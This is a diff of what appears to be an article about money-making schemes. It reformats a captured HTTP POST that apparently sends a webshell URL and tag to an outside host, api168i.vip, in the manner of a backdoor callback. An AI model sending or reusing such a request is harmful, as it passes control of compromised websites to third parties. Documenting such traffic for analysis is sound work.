@@ -18,13 +18,21 @@ These are some things encountered on the road to making money, converted into ar
 
 
 `POST /abc1.php HTTP/1.1`
+
 `Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*`
+
 `Referer: http://api168i.vip/abc1.php`
+
 `Accept-Language: zh-cn`
+
 `Content-Type: application/x-www-form-urlencoded`
+
 `Content-Length: 43`
+
 `User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)`
+
 `Host: api168i.vip`
+
 `Cache-Control: no-cache`
 
 `hm=http://xxxx/bak111.php||xise`
